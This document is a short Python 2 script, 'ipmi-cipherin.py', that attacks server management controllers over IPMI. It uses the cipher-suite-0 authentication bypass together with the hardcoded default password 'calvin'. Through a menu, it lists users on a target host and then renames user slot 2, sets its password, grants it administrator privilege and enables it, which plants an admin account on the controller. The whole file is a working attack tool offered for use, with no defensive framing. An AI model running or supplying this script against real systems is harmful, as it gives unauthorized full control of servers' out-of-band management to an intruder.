#!/usr/bin/python

import sys
import subprocess
import os

#argument check
if(len(sys.argv) < 2):
	print "ipmi-cipherin.py <host-IP>"
	sys.exit(2)
else:
	#get IP
	ip = sys.argv[1]

##FUNCTIONS
def findUser(username):
	os.system('clear')
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",username,"-P","calvin","user","list"], stdout=subprocess.PIPE)
	result, err = p.communicate()
	print result
	print "\n"
	return

def changeUser(tmpuser):
	global user
	os.system('clear')
	user = tmpuser
	return

def changePass(username, newuser, password):
	os.system('clear')
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",username,"-P","calvin","user","set","name","2",newuser], stdout=subprocess.PIPE)
	result, err = p.communicate()
	print result
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",username,"-P","calvin","user","set","password","2",password], stdout=subprocess.PIPE)
	result, err = p.communicate()
	print result
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",username,"-P","calvin","user","priv","2","4"], stdout=subprocess.PIPE)
	result, err = p.communicate()
	print result
	p = subprocess.Popen(["./usr/bin/ipmitool","-I","lanplus","-C","0","-H",ip,"-U",username,"-P","calvin","user","enable","2"], stdout=subprocess.PIPE)
	result, err = p.communicate()
	print result
	return


#MAIN
try:
	os.system('clear')
	user = raw_input("Please enter the built in IPMI account's username to use: ")
	while True:
		print (30 * '-')
		print (" IMPI-CIPHERIN")
		print (30 * '-')
		print ("1. Show full user list")
		print ("2. Add new user, set password, and elevate")
		print ("3. Change default admin username")
		print ("4. EXIT")
		print (30 * '-') 
		print (30 * '-')
		choice = raw_input('Enter your choice [1-4] : ')
		try:
			choice = int(choice)
		except ValueError:
			print "\n[*] ERROR:  Please provide a numeric choice.\n"
		if choice == 1:
			findUser(user)
		elif choice == 2:
			newuser = raw_input('New username: ')
			password = raw_input('New password: ')
			changePass(user, newuser, password)
		elif choice == 3:
			tmpuser = raw_input('Default username: ')
			changeUser(tmpuser)
		elif choice == 4:
			break
		else: 
			print ("Invalid number. Try again...")
except KeyboardInterrupt:
	print "\n\nYou just quit!"